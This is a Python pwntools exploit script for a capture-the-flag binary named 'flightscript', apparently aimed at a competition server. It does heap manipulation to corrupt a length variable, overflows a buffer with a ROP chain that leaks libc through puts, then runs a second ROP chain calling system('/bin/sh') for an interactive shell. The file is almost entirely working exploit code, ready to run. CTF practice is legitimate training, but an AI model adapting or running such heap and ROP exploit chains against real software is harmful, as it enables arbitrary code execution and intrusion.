from pwn import *
import pwn
import random as rnd
import struct as st
from time import sleep
import re
import subprocess

context.arch = "amd64"
context.word_size = 64
context.bits = 64
context.os = "linux"

file = "./flightscript_patched"
exe_args = []
io: process = None
PREFIX = b">> "

speed = 0.2

def debug():
    gdb.attach(io, gdbscript=
    """
    
    """)
    input("debug")

def launch_remote():
    global file, io
    io = remote("chal.competitivecyber.club", 8885)

def launch_local():
    global file, io
    io = process([file, *exe_args])
    if args.GDB:
        debug()

def solve_pow():
    leak = recvu(b"===================")
    pow = getb(leak, b") solve ", b"\n").decode()
    proc = subprocess.Popen(["solvepow", "solve", pow], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
    pow = proc.communicate()[0]
    sla(b"Solution? ", pow)

u64 = lambda d: pwn.u64(d.ljust(8, b"\0")[:8])
u32 = lambda d: pwn.u32(d.ljust(4, b"\0")[:4])
u16 = lambda d: pwn.u16(d.ljust(2, b"\0")[:2])
sla = lambda a, b: io.sendlineafter(a, b)
sa = lambda a, b: io.sendafter(a, b)
sl = lambda a: io.sendline(a)
recv = lambda: io.recv()
recvn = lambda a: io.recvn(a)
recvu = lambda a, b=False: io.recvuntil(a, b)
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
binsh = lambda: next(libc.search(b"/bin/sh\0"))
snum = lambda a, b: sla(a, str(b).encode("iso-8859-1"))
sprefix = lambda a: sla(PREFIX, a)
choice = lambda a: snum(PREFIX, a)

def launch():
    if args.REMOTE:
        l = launch_remote
    else:
        l = launch_local
    with context.local(log_level=logging.ERROR):
        l()
    if args.POW:
        solve_pow()

def getb(d, a, b):
    a_ = d.find(a)
    if a_ == -1 or a == b"": a_ = 0
    b_ = d.find(b, a_+len(a))
    if b_ == -1 or b == b"": b_ = len(d)
    return d[a_+len(a):b_]

# ================================================================
# EXPLOIT HERE
# ================================================================

with context.local(log_level=logging.ERROR):
    exe = ELF(file)
    libc = ELF("./libc.so.6")

tries = 0
# tries_prog = log.progress("Tries")
def exploit():
    def flight_log(data):
        choice(1)
        sprefix(data)
    def alloc(size, data=b"", save=False):
        choice(2)
        choice(size)
        sprefix(data)
        sprefix(b"y" if save else b"n")
    def edit(index, data):
        choice(3)
        choice(index)
        sprefix(data)
    def free(index):
        choice(4)
        choice(index)
    def quit():
        choice(5)

    alloc(0x468, b"", True)
    alloc(0x28, b"", False)
    alloc(0x438, b"", True)
    alloc(0x28, b"", False)

    free(0)
    alloc(0x478, b"", False)

    edit(0, p64(exe.sym["loglen"] - 0x20))

    free(2)
    alloc(0x478, b"", False)

    pop_rdi = 0x00000000004011dc
    payload = flat([
        pop_rdi,
        exe.got.puts,
        exe.plt.puts,
        exe.sym.main,
    ])
    flight_log(b"A"*0x118 + payload)
    quit()

    leak = recvu(b"\n  ")
    leak = getb(leak, b"nice day!\n", b"\n  ")
    libc.address = u64(leak) - libc.sym.puts
    success("libc: %#018x" % libc.address)

    payload = flat([
        pop_rdi,
        binsh(),
        libc.sym.do_system+2,
    ])
    flight_log(b"A"*0x118 + payload)
    quit()

    io.interactive()
    input("end")
    exit()

launch()
exploit()
exit()

while True:
    count = 0
    tries += 1
    tries_prog.status(str(tries))

    launch()
    try:
        exploit()
    except EOFError:
        pass

    with context.local(log_level=logging.ERROR):
        io.close()
    # sleep(0.05)